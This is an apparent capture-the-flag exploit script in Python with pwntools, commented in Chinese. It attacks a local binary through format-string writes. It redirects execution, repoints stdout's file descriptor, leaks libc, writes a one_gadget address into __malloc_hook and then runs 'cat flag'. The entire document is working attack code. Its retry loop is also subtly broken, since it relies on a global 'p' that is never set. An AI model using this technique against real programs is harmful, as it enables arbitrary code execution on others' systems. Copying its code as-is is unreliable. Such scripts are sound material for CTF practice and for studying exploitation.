#!/usr/bin/python3
#-*- coding:utf8 -*-
from pwn import *

context.log_level = 'debug'
libc = ELF('/usr/lib/libc.so.6')

def pwn(param1, param2, param3, p):
    payload = '%{}c%{}${}'.format(param1, param2, param3)
    p.sendline(payload)

def leak(p):
    p.recvuntil('start!\n')
    stack_addr = p.recv(14)
    addr = int(stack_addr, 16)
    info("addr ==> " + hex(addr))
    return addr
    

def exploit():
    p = process('./pwn')

    start = 0x17b0
    #start = 0x8e0

    # leak stack addr
    addr = leak(p)

    offset = (addr - 12) & 0xffff
    info("offset ==> " + hex(offset))

    # 限制在这个范围才能正常使用%n
    if offset > 0x2000 or offset < 0x66c:
        p.close()
        return 0

    #################################################################
    #gdb.attach(p)
    pwn(offset, 11, 'hn', p)
    # 修改printf的返回值为start，使栈向低地址方向生长
    #gdb.attach(p)
    pwn(start, 37, 'hn', p)

    # 修改_IO_2_1_stdout_中的fileno=0x2
    offset = (addr - 0x54) & 0xffff
    info("offset ==> " + hex(offset))

    # 修改栈数据
    # 这里因为地址问题可能导致程序崩溃
    pwn(offset, 10, 'hn', p)

    # 修改栈中的_IO_2_1_stdout_指针指向fileno
    pwn(0x90, 36, 'hhn', p)
    # 修改fileno的值为0x2
    pwn(2, 26, 'hhn', p)
    #################################################################

    # leak libc address
    #gdb.attach(p)
    pwn(1, 9, 'p', p)
    p.recvuntil('\x01\x01')
    libc_base = int(p.recv(14), 16) - 0x20840
    libc.address = libc_base
    info("libc_base ==> " + hex(libc_base))
    
    if libc_base >> 40 != 0x7F:
        raise Exception('error leak!')

    one_gadget = [0x45226 + libc_base, 0x4527a + libc_base, 0xf0364 + libc_base, 0xf1207 + libc_base]
    malloc_hook = libc.symbols['__malloc_hook']

    # 把__malloc_hook添加到栈上
    pwn((malloc_hook & 0xffff), 36, 'hn', p) 
    # 向__malloc_hook中写入one_gadget
    pwn((one_gadget[3] & 0xffff), 26, 'hn', p)

    pwn(((malloc_hook + 2) & 0xffff), 36, 'hn', p) 
    pwn(((one_gadget[3] >> 16) & 0xffff), 26, 'hn', p)

    pwn(((malloc_hook + 4) & 0xffff), 36, 'hn', p) 
    #gdb.attach(p)
    pwn(((one_gadget[3] >> 32) & 0xffff), 26, 'hn', p)

    p.sendline("%99999c%10$n")
    p.sendline("cat flag 1>&2")
   
while True:
   try:
      global p
      exploit()
      p.interactive()
   except:
      p.close()
      print ('trying...')
